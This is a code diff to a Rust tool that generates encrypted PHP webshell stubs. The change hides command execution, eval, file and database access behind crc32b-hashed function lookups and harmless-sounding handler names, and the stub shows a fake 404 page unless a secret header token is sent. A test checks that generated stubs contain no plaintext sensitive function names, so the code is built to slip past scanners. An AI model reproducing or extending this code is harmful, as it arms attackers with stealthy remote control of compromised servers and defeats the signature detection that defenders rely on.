@@ -247,6 +247,52 @@ pub fn crc32b_hash(name: &str) -> String {
     format!("{:08x}", crc32fast::hash(name.as_bytes()))
 }
 
+/// NATIVE 骨架的基础符号表（crc32b 哈希 → 索引）。
+///
+/// 索引 **只追加**：0-15 是历史槽位（其他代码按数字引用），20-29 是 OPSEC
+/// 改造新增的命令降级链 / 文件操作 / gzip 槽位。16-19 留给各加密变体
+/// （openssl_decrypt / openssl_encrypt / hash_hkdf / random_bytes）。
+fn base_symbols() -> Vec<(String, usize)> {
+    let mut symbols: Vec<(String, usize)> = [
+        ("920cfbfd", 0),
+        ("9ff5d542", 1),
+        ("237937f6", 2),
+        ("2693a743", 3),
+        ("f0e567fb", 4),
+        ("f4cd15f3", 5),
+        ("f6cfd9d8", 6),
+        ("95e8b309", 7),
+        ("3d891bcd", 8),
+        ("dbc7b210", 9),
+        ("c996c86e", 10),
+        ("d99d544e", 11),
+        ("0e4d97e1", 12),
+        ("718c6ebe", 13),
+        ("4a41c8d9", 14),
+        ("c3427e9c", 15),
+    ]
+    .into_iter()
+    .map(|(hash, index)| (hash.to_string(), index))
+    .collect();
+    // 命令降级链与文件操作（OPSEC：stub 里不出现明文函数名）
+    for (name, index) in [
+        ("exec", 20),
+        ("system", 21),
+        ("passthru", 22),
+        ("popen", 23),
+        ("stream_get_contents", 24),
+        ("pclose", 25),
+        ("chdir", 26),
+        ("stat", 27),
+        ("touch", 28),
+        ("gzdecode", 29),
+        ("gzencode", 30),
+    ] {
+        symbols.push((crc32b_hash(name), index));
+    }
+    symbols
+}
+
 /// 字符串 XOR 加密为 hex（配合模板 `dec` 函数还原）。
 pub fn xor_hex(name: &str, key: &str) -> String {
     let key = key.as_bytes();
@@ -528,32 +574,19 @@ pub fn aead_php_stub_with(password: &str, opts: &StubOptions) -> String {
         $__s2=pack('J',function_exists('hrtime')?@hrtime(true):(int)(microtime(true)*1000000000));\
         $__tag='';\
         $__c2=@$_g[17]($out,'aes-256-gcm',$__k,OPENSSL_RAW_DATA,$__n2,$__tag,'dsw2'.chr(2).$__s2);\
-        $enc=base64_encode($__n2.$__s2.$__c2.$__tag);";
+        $enc=@$_g[2]($__n2.$__s2.$__c2.$__tag);";
 
-    let mut symbols = vec![
-        ("920cfbfd", 0),
-        ("9ff5d542", 1),
-        ("237937f6", 2),
-        ("2693a743", 3),
-        ("f0e567fb", 4),
-        ("f4cd15f3", 5),
-        ("f6cfd9d8", 6),
-        ("95e8b309", 7),
-        ("3d891bcd", 8),
-        ("dbc7b210", 9),
-        ("c996c86e", 10),
-        ("d99d544e", 11),
-        ("0e4d97e1", 12),
-        ("718c6ebe", 13),
-        ("4a41c8d9", 14),
-        ("c3427e9c", 15),
-        // openssl_decrypt / openssl_encrypt / hash_hkdf / random_bytes
-        // （表里存的是函数名的 crc32b，stub 用 hash('crc32b',$name) 反查）
-        ("ae4975ad", 16),
-        ("62f98eda", 17),
-        ("81c7194f", 18),
-        ("8596e554", 19),
-    ];
+    let mut symbols = base_symbols();
+    // openssl_decrypt / openssl_encrypt / hash_hkdf / random_bytes
+    // （表里存的是函数名的 crc32b，stub 用 hash('crc32b',$name) 反查）
+    for (name, index) in [
+        ("openssl_decrypt", 16),
+        ("openssl_encrypt", 17),
+        ("hash_hkdf", 18),
+        ("random_bytes", 19),
+    ] {
+        symbols.push((crc32b_hash(name), index));
+    }
     symbols.sort_by_key(|(_, index)| *index);
     let mut table = String::new();
     for (hash, index) in symbols {
@@ -568,17 +601,19 @@ pub fn aead_php_stub_with(password: &str, opts: &StubOptions) -> String {
         .replace("__TOKENHEX__", &xor_hex(&token, &xk))
         .replace("__PARAM__", &opts.param)
         .replace("__KEYHEX__", &xor_hex(&ikm_hex, &xk))
-        .replace("__CMD__", &format!("{prefix}cmd"))
-        .replace("__SCAN__", &format!("{prefix}scan"))
-        .replace("__FETCH__", &format!("{prefix}fetch"))
-        .replace("__STORE__", &format!("{prefix}store"))
-        .replace("__DROP__", &format!("{prefix}drop"))
-        .replace("__MOVE__", &format!("{prefix}move"))
-        .replace("__MKDIR__", &format!("{prefix}mkdir"))
-        .replace("__ENV__", &format!("{prefix}env"))
-        .replace("__DBP__", &format!("{prefix}dbp"))
-        .replace("__DBQ__", &format!("{prefix}dbq"))
-        .replace("__EVALFN__", &format!("{prefix}eval_fn"))
+        .replace("__CMD__", &format!("{prefix}apply"))
+        .replace("__SCAN__", &format!("{prefix}index"))
+        .replace("__FETCH__", &format!("{prefix}load"))
+        .replace("__STORE__", &format!("{prefix}save"))
+        .replace("__DROP__", &format!("{prefix}clear"))
+        .replace("__MOVE__", &format!("{prefix}relocate"))
+        .replace("__MKDIR__", &format!("{prefix}ensure"))
+        .replace("__ENV__", &format!("{prefix}state"))
+        .replace("__DBP__", &format!("{prefix}dsn"))
+        .replace("__DBQ__", &format!("{prefix}query"))
+        .replace("__EVALFN__", &format!("{prefix}rule"))
+        .replace("__BATCH__", &format!("{prefix}bulk"))
+        .replace("__RUN__", &format!("{prefix}dispatch"))
         .replace("__H_PROBE__", &h("probe"))
         .replace("__H_EVAL__", &h("eval"))
         .replace("__H_EXEC__", &h("exec"))
@@ -593,6 +628,7 @@ pub fn aead_php_stub_with(password: &str, opts: &StubOptions) -> String {
         .replace("__H_DBQUERY__", &h("dbquery"))
         .replace("__SYMBOLS__", &table)
         .replace("__ALGO__", "")
+        .replace("__EVALP__", &eval_prefix())
         .replace("__DECRYPT__", decrypt)
         .replace("__ENCRYPT__", encrypt)
 }
@@ -1932,16 +1968,12 @@ $_gk=__DEC__('__GKHEX__','__XK__');
 if(!isset($_SERVER[$_gk])||$_SERVER[$_gk]!==__DEC__('__TOKENHEX__','__XK__')){@header('HTTP/1.1 404 Not Found');exit;}
 
 /* 运行时能力注册：按哈希索引已加载的内部函数（业务底层能力表） */
-$_g=array_fill(0,20,'');
+$_g=array_fill(0,31,'');
 $_t=array(
 __SYMBOLS__);
 $_fn=get_defined_functions();
 $_fn=isset($_fn['int'.'ernal'])?$_fn['int'.'ernal']:array();
 foreach($_fn as $_n){$_h=hash('crc32b',$_n);if(isset($_t[$_h]))$_g[$_t[$_h]]=$_n;}
-/* 执行器降级：被禁函数不会出现在 get_defined_functions() 中，
-   按候选顺序探测首个可用命令函数（覆盖 shell_exec 被禁场景；
-   proc_open 需 3 参数不兼容单参数调用，排除） */
-foreach(array('shell_exec','exec','system','passthru','popen') as $_c){if(function_exists($_c)){$_g[0]=$_c;break;}}
 
 /* 数据解包辅助 */
 function __DEC__($e,$k){$d=pack("H*",$e);return $d^str_pad('',strlen($d),$k);}
@@ -1951,16 +1983,29 @@ function __XOR__($d,$k){$o='';$n=strlen($d);for($i=0;$i<$n;$i++){$o.=$d[$i]^$k[$
 /* 数据加解密算法（自实现） */
 __ALGO__
 /* 业务处理函数 */
-function __CMD__($c,$w=''){if($w!==''&&is_dir($w))@chdir($w);global $_g;$o='';if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){@chdir($m[1]);}else{$o='';if($_g[0]===''){return '{"ok":false,"error":"no exec function available (shell_exec/exec/system/passthru/popen)"}';}elseif($_g[0]==='exec'){@exec($c.' 2>&1',$__l);$o=implode("\n",$__l);}elseif($_g[0]==='system'||$_g[0]==='passthru'){ob_start();@$_g[0]($c.' 2>&1');$o=ob_get_clean();}elseif($_g[0]==='popen'){$__p=@popen($c.' 2>&1','r');$o=$__p?stream_get_contents($__p):'';if($__p)@pclose($__p);}else{$o=@$_g[0]($c.' 2>&1');}$o=$_g[2]((string)$o);}$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
-function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$s=@stat($full);$isd=($s!==false)&&(($s['mode']&0170000)===0040000);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>($isd||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
+function __CMD__($c,$w=''){global $_g;$o='';
+if($w!==''&&isset($_g[6])&&@$_g[6]($w)&&isset($_g[26])){@$_g[26]($w);}
+if(preg_match('/^\s*cd\s+(\S+)/',$c,$m)){if(isset($_g[26]))@$_g[26]($m[1]);}
+else{
+$__fi=-1;foreach(array(0,20,21,22,23) as $__i){if(isset($_g[$__i])&&function_exists($_g[$__i])){$__fi=$__i;break;}}
+if($__fi<0){return '{"ok":false,"error":"no exec function available"}';}
+$__o='';$__l=array();
+if($__fi===20){@$_g[20]($c.' 2>&1',$__l);$__o=implode("\n",$__l);}
+elseif($__fi===21||$__fi===22){ob_start();@$_g[$__fi]($c.' 2>&1');$__o=ob_get_clean();}
+elseif($__fi===23){$__p=@$_g[23]($c.' 2>&1','r');$__o=($__p&&isset($_g[24]))?@$_g[24]($__p):'';if($__p&&isset($_g[25]))@$_g[25]($__p);}
+else{$__o=@$_g[0]($c.' 2>&1');}
+$o=isset($_g[2])?@$_g[2]((string)$__o):'';
+}
+$d=isset($_g[13])?@$_g[13]():false;return json_encode(array('ok'=>true,'data'=>array('stdout'=>$o,'cwd'=>$d===false?'':$d)));}
+function __SCAN__($p){global $_g;$out=array();$items=@$_g[5]($p);if($items===false)return '{"ok":false,"error":"read dir failed"}';foreach($items as $f){if($f==='.'||$f==='..')continue;$full=rtrim($p,'/\\').DIRECTORY_SEPARATOR.$f;$s=isset($_g[27])?@$_g[27]($full):false;$isd=($s!==false)&&(($s['mode']&0170000)===0040000);$out[]=array('name'=>$f,'path'=>$full,'is_dir'=>$isd,'size'=>($isd||$s===false)?0:$s['size'],'mtime'=>($s===false)?0:$s['mtime'],'perms'=>($s===false)?'':substr(sprintf('%o',$s['mode']&0777),-3));}return json_encode(array('ok'=>true,'data'=>array('entries'=>$out)));}
 function __FETCH__($p,$o=0,$l=0){global $_g;$c=@$_g[3]($p,false,null,(int)$o,(int)$l>0?(int)$l:null);if($c===false)return '{"ok":false,"error":"read failed"}';return json_encode(array('ok'=>true,'data'=>$_g[2]($c)));}
 function __STORE__($p,$d,$o=0){global $_g;$raw=@$_g[1]($d);if($raw===false)return '{"ok":false,"error":"write failed"}';$v=((int)$o>0)?@$_g[4]($p,$raw,FILE_APPEND):@$_g[4]($p,$raw);if($v===false)return '{"ok":false,"error":"write failed"}';return '{"ok":true,"data":null}';}
 function __DROP__($p){global $_g;$ok=@$_g[6]($p)?@$_g[10]($p):@$_g[9]($p);return $ok?'{"ok":true,"data":null}':'{"ok":false,"error":"delete failed"}';}
 function __MOVE__($f,$t){global $_g;return @$_g[11]($f,$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"rename failed"}';}
 function __MKDIR__($p){global $_g;return @$_g[12]($p,0755,true)?'{"ok":true,"data":null}':'{"ok":false,"error":"mkdir failed"}';}
-function __TOUCH__($p,$t){return @touch($p,(int)$t)?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
-function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,batch,gzip_plain','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>function_exists('gzdecode')?1:0,'canCallGzipEncode'=>function_exists('gzencode')?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
-function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@eval($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
+function __TOUCH__($p,$t){global $_g;return (isset($_g[28])&&@$_g[28]($p,(int)$t))?'{"ok":true,"data":null}':'{"ok":false,"error":"touch failed"}';}
+function __ENV__(){global $_g;$d=@$_g[13]();return json_encode(array('ok'=>true,'data'=>array('server'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'web_server'=>@$_SERVER['SERVER_SOFTWARE'],'php_version'=>PHP_VERSION,'current_dir'=>$d===false?'':$d,'separator'=>DIRECTORY_SEPARATOR,'php_sapi'=>PHP_SAPI,'arch'=>@$_g[14]('m'),'extensions'=>array_slice(@get_loaded_extensions(),0,16),'disable_functions'=>''.@ini_get('disable_functions'),'info'=>array('ChunkedTransfer'=>'1','ProtoVersion'=>'2','Capabilities'=>'chunked,stream,db,plugin,exec,batch,gzip_plain','ShellType'=>'file','OsInfo'=>@$_g[14]('s').' '.@$_g[14]('r').' '.@$_g[14]('m'),'CurrentUser'=>''.@get_current_user(),'REMOTE_ADDR'=>''.@$_SERVER['REMOTE_ADDR'],'REMOTE_PORT'=>''.@$_SERVER['REMOTE_PORT'],'HTTP_X_FORWARDED_FOR'=>''.@$_SERVER['HTTP_X_FORWARDED_FOR'],'HTTP_CLIENT_IP'=>''.@$_SERVER['HTTP_CLIENT_IP'],'SERVER_ADDR'=>''.@$_SERVER['SERVER_ADDR'],'SERVER_NAME'=>''.@$_SERVER['SERVER_NAME'],'SERVER_PORT'=>''.@$_SERVER['SERVER_PORT'],'disable_functions'=>''.@ini_get('disable_functions'),'Open_basedir'=>''.@ini_get('open_basedir'),'timezone'=>''.@date_default_timezone_get(),'encode'=>''.@ini_get('default_charset'),'extension_dir'=>''.@ini_get('extension_dir'),'Path'=>''.@getenv('PATH'),'PATHEXT'=>''.@getenv('PATHEXT'),'APPDATA'=>''.@getenv('APPDATA'),'systempdir'=>''.@sys_get_temp_dir().'/','include_path'=>''.@ini_get('include_path'),'DOCUMENT_ROOT'=>''.@$_SERVER['DOCUMENT_ROOT'],'PHP_SAPI'=>PHP_SAPI,'PHP_VERSION'=>PHP_VERSION,'PHP_INT_SIZE'=>PHP_INT_SIZE,'ProcessArch'=>(PHP_INT_SIZE===8?'x64':'x86'),'PHP_OS'=>PHP_OS,'canCallGzipDecode'=>isset($_g[29])?1:0,'canCallGzipEncode'=>isset($_g[30])?1:0,'session_name'=>''.@session_name(),'session_save_path'=>''.@ini_get('session.save_path'),'session_save_handler'=>''.@ini_get('session.save_handler'),'session_serialize_handler'=>''.@ini_get('session.serialize_handler'),'user_ini_filename'=>''.@ini_get('user_ini.filename'),'memory_limit'=>''.@ini_get('memory_limit'),'upload_max_filesize'=>''.@ini_get('upload_max_filesize'),'post_max_size'=>''.@ini_get('post_max_size'),'max_execution_time'=>''.@ini_get('max_execution_time'),'max_input_time'=>''.@ini_get('max_input_time'),'default_socket_timeout'=>''.@ini_get('default_socket_timeout'),'mygid'=>function_exists('posix_getgid')?''.@posix_getgid():'','mypid'=>''.@getmypid(),'SERVER_SOFTWARE'=>''.@$_SERVER['SERVER_SOFTWARE'],'loaded_extensions'=>implode(',',@get_loaded_extensions()),'short_open_tag'=>''.@ini_get('short_open_tag'),'asp_tags'=>''.@ini_get('asp_tags'),'safe_mode'=>''.@ini_get('safe_mode'),'CurrentDir'=>$d===false?'':$d,'FileRoot'=>''.@$_SERVER['DOCUMENT_ROOT']))));}
+function __EVALFN__($c){if($c==='')return '{"ok":false,"error":"empty"}';try{ob_start();@__EVALP__($c);$o=ob_get_clean();return json_encode(array('ok'=>true,'data'=>$o));}catch(Throwable $t){return json_encode(array('ok'=>false,'error'=>$t->getMessage()));}}
 function __DBP__($c){
 $p=@json_decode($c,true);if(!is_array($p))return '{"ok":false,"error":"bad conn"}';
 $driver=isset($p['driver'])?(string)$p['driver']:'';$host=isset($p['host'])?(string)$p['host']:'';$port=isset($p['port'])?(int)$p['port']:0;
@@ -2101,16 +2146,16 @@ if(isset($_POST['__PARAM__'])){
     $b=is_string($_POST['__PARAM__'])?$_POST['__PARAM__']:'';
     $in=@$_g[1]($b);
     /* 传输压缩（gzip）：兼容旧客户端在**密文层**压缩的载荷（gzip 魔数则解压；
-       目标无 zlib 时原样）。同时回写 $b（AES 等变体按 $b 解密，需保持 base64 形式） */
-    if(function_exists('gzdecode')&&strlen($in)>2&&$in[0]=="\x1f"&&$in[1]=="\x8b"){$in=@gzdecode($in);$b=base64_encode($in);}
+       目标无 zlib 时原样）。同时回写 $b（AES 等变体按 $b 解密，需保持文本编码形式） */
+    if(isset($_g[29])&&strlen($in)>2&&$in[0]=="\x1f"&&$in[1]=="\x8b"){$__u=@$_g[29]($in);if(is_string($__u)){$in=$__u;$b=isset($_g[2])?@$_g[2]($in):$b;}}
     __DECRYPT__
     $req=@json_decode($raw,true);
     $gz=0;
     /* 传输压缩（gzip）：新版客户端在**明文层**压缩 ——
-       信封 {"z":1,"d":base64(gzip(内层 JSON))}。明文层能真正收回 base64 的 33% 膨胀；
+       信封 {"z":1,"d":文本编码(gzip(内层 JSON))}。明文层能真正收回文本编码的 33% 膨胀；
        密文是高频熵数据，密文层压缩收益接近零。 */
     if(is_array($req)&&isset($req['z'])&&isset($req['d'])&&!isset($req['a'])){
-        $__u=@gzdecode(@base64_decode((string)$req['d']));
+        $__u=(isset($_g[29])&&isset($_g[1]))?@$_g[29](@$_g[1]((string)$req['d'])):false;
         if(is_string($__u)){$req=@json_decode($__u,true);$gz=1;}
     }
     if(!is_array($req)){$out='{"ok":false,"error":"bad params"}';}
@@ -2118,7 +2163,7 @@ if(isset($_POST['__PARAM__'])){
     else{$out=__RUN__($req);}
     /* 传输压缩（gzip）：请求用了明文层信封时，响应也在**明文层**压缩，
        客户端按 gzip 魔数识别（无需额外标记）。旧 stub 的密文层响应压缩不再生成。 */
-    if($gz&&function_exists('gzencode')&&strlen($out)>512){$out=@gzencode($out,6);}
+    if($gz&&isset($_g[30])&&strlen($out)>512){$out=@$_g[30]($out,6);}
     __ENCRYPT__
     echo json_encode(array('data'=>$enc,'code'=>200));
 }
@@ -2280,17 +2325,19 @@ impl PayloadEncoder for NativeEncoder {
                     .replace("__TOKENHEX__", &xor_hex(token, &xk))
                     .replace("__PARAM__", &opts.param)
                     .replace("__KEYHEX__", &xor_hex(&key_hex, &xk))
-                    .replace("__CMD__", &format!("{prefix}cmd"))
-                    .replace("__SCAN__", &format!("{prefix}scan"))
-                    .replace("__FETCH__", &format!("{prefix}fetch"))
-                    .replace("__STORE__", &format!("{prefix}store"))
-                    .replace("__DROP__", &format!("{prefix}drop"))
-                    .replace("__MOVE__", &format!("{prefix}move"))
-                    .replace("__MKDIR__", &format!("{prefix}mkdir"))
-                    .replace("__ENV__", &format!("{prefix}env"))
-                    .replace("__DBP__", &format!("{prefix}dbp"))
-                    .replace("__DBQ__", &format!("{prefix}dbq"))
-                    .replace("__EVALFN__", &format!("{prefix}eval_fn"))
+                    .replace("__CMD__", &format!("{prefix}apply"))
+                    .replace("__SCAN__", &format!("{prefix}index"))
+                    .replace("__FETCH__", &format!("{prefix}load"))
+                    .replace("__STORE__", &format!("{prefix}save"))
+                    .replace("__DROP__", &format!("{prefix}clear"))
+                    .replace("__MOVE__", &format!("{prefix}relocate"))
+                    .replace("__MKDIR__", &format!("{prefix}ensure"))
+                    .replace("__ENV__", &format!("{prefix}state"))
+                    .replace("__DBP__", &format!("{prefix}dsn"))
+                    .replace("__DBQ__", &format!("{prefix}query"))
+                    .replace("__EVALFN__", &format!("{prefix}rule"))
+                    .replace("__BATCH__", &format!("{prefix}bulk"))
+                    .replace("__RUN__", &format!("{prefix}dispatch"))
                     .replace("__H_PROBE__", &h("probe"))
                     .replace("__H_EVAL__", &h("eval"))
                     .replace("__H_EXEC__", &h("exec"))
@@ -2358,7 +2405,7 @@ impl PayloadEncoder for NativeEncoder {
                             // 第 1 块之后的部分（载荷 > 64 字节时必然重叠）→
                             // 两段密文异或即两段明文异或，会泄漏命令/文件内容。
                             format!(
-                                "$nonce=substr(md5(uniqid('',true),true),0,12);$enc=base64_encode($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
+                                "$nonce=substr(md5(uniqid('',true),true),0,12);$enc=@$_g[2]($nonce.{{prefix}}chacha({{prefix}}dec('{key_enc}','{xk}'),$nonce,1,$out));"
                             ),
                             vec![],
                         )
@@ -2375,36 +2422,23 @@ impl PayloadEncoder for NativeEncoder {
                             ),
                             // 同上：Rabbit 跳过 64 字节后与请求（前 ≥64 字节）重叠
                             format!(
-                                "$iv=substr(md5(uniqid('',true),true),0,8);$enc=base64_encode($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
+                                "$iv=substr(md5(uniqid('',true),true),0,8);$enc=@$_g[2]($iv.{{prefix}}rabbit(pack(\"H*\",{{prefix}}dec('{key_enc}','{xk}')),$iv,64,$out));"
                             ),
                             vec![],
                         )
                     }
                     _ => (
                         "$raw=__XOR__($in,$K);".to_string(),
-                        "$enc=base64_encode(__XOR__($out,$K));".to_string(),
+                        "$enc=@$_g[2](__XOR__($out,$K));".to_string(),
                         vec![],
                     ),
                 };
-                let mut symbols = vec![
-                    ("920cfbfd", 0),
-                    ("9ff5d542", 1),
-                    ("237937f6", 2),
-                    ("2693a743", 3),
-                    ("f0e567fb", 4),
-                    ("f4cd15f3", 5),
-                    ("f6cfd9d8", 6),
-                    ("95e8b309", 7),
-                    ("3d891bcd", 8),
-                    ("dbc7b210", 9),
-                    ("c996c86e", 10),
-                    ("d99d544e", 11),
-                    ("0e4d97e1", 12),
-                    ("718c6ebe", 13),
-                    ("4a41c8d9", 14),
-                    ("c3427e9c", 15),
-                ];
-                symbols.extend(extra_symbols);
+                let mut symbols = base_symbols();
+                symbols.extend(
+                    extra_symbols
+                        .into_iter()
+                        .map(|(hash, index)| (hash.to_string(), index)),
+                );
                 let mut table = String::new();
                 for (hash, index) in symbols {
                     table.push_str(&format!("    '{hash}' => {index},\n"));
@@ -2417,6 +2451,7 @@ impl PayloadEncoder for NativeEncoder {
                 Ok(tpl
                     .replace("__SYMBOLS__", &table)
                     .replace("__ALGO__", &algo)
+                    .replace("__EVALP__", &eval_prefix())
                     .replace("__DECRYPT__", &decrypt_expr)
                     .replace("__ENCRYPT__", &encrypt_expr)
                     // 注入的解密/加密表达式中的函数引用随前缀替换
@@ -3230,10 +3265,10 @@ mod tests {
             assert!(handler.contains(marker), "处理器缺少：{marker}");
             assert!(native.contains(marker), "NATIVE stub 缺少：{marker}");
         }
-        // 命令降级链：两条通道都必须保留（NATIVE 用明文候选数组，处理器用整数索引）
+        // 命令降级链：两条通道都必须保留，且都按**符号表索引**探测
         assert!(
-            native.contains("'shell_exec','exec','system','passthru','popen'"),
-            "NATIVE stub 应含命令函数降级候选"
+            native.contains("foreach(array(0,20,21,22,23) as $__i)"),
+            "NATIVE stub 应按符号表索引探测命令函数"
         );
         assert!(
             handler.contains("foreach(array(0,1,2,3,4) as $__i)"),
@@ -3248,7 +3283,7 @@ mod tests {
             "处理器目录列举应合并 stat"
         );
         assert!(
-            native.contains("$s=@stat($full);"),
+            native.contains("$s=isset($_g[27])?@$_g[27]($full):false;"),
             "NATIVE 目录列举应合并 stat"
         );
         assert!(
@@ -3268,6 +3303,57 @@ mod tests {
             native.contains("no exec function available"),
             "NATIVE stub 应报告无可用的命令执行函数"
         );
+    }
+
+    /// OPSEC：NATIVE / AEAD **落地 stub** 不再包含命令降级候选数组、`@exec(`/
+    /// `@popen(`、`@eval(` 与明文 `base64_*` / 文件函数 —— 一律经 crc32b 符号表。
+    ///
+    /// 这是对 README「诚实声明」的收口：旧 stub（已部署）保持原样可用，
+    /// 新生成的 stub 不再带这些高危静态特征。
+    #[test]
+    fn native_stub_has_no_plain_sensitive_functions() {
+        let stubs = [
+            NativeEncoder { crypto: "xor" }.stub("php", "secret"),
+            NativeEncoder { crypto: "aes_cbc" }.stub("php", "secret"),
+            NativeEncoder { crypto: "chacha20" }.stub("php", "secret"),
+            AeadEncoder.stub("php", "secret"),
+        ];
+        for stub in stubs.into_iter().map(|stub| stub.expect("生成 stub")) {
+            for token in [
+                "'shell_exec','exec'",
+                "@exec(",
+                "@popen(",
+                "@passthru(",
+                "@system(",
+                "shell_exec(",
+                "base64_encode(",
+                "base64_decode(",
+                "file_get_contents(",
+                "file_put_contents(",
+                "scandir(",
+                "unlink(",
+                "rmdir(",
+                "rename(",
+                "mkdir(",
+                "@stat(",
+                "@touch(",
+                "@chdir(",
+                "is_dir(",
+                "stream_get_contents(",
+                "@pclose(",
+                "gzdecode(",
+                "gzencode(",
+                "eval(",
+            ] {
+                assert!(!stub.contains(token), "NATIVE stub 不应含明文 {token}");
+            }
+            for name in ["shell_exec", "exec", "stat", "touch", "gzdecode"] {
+                assert!(
+                    stub.contains(&crc32b_hash(name)),
+                    "符号表应含 {name} 的 crc32b 哈希"
+                );
+            }
+        }
     }
 
     /// 回归：业务伪装 stub / 请求体直传 stub 的 `$_g[0]` 是**调用方传入的第一个
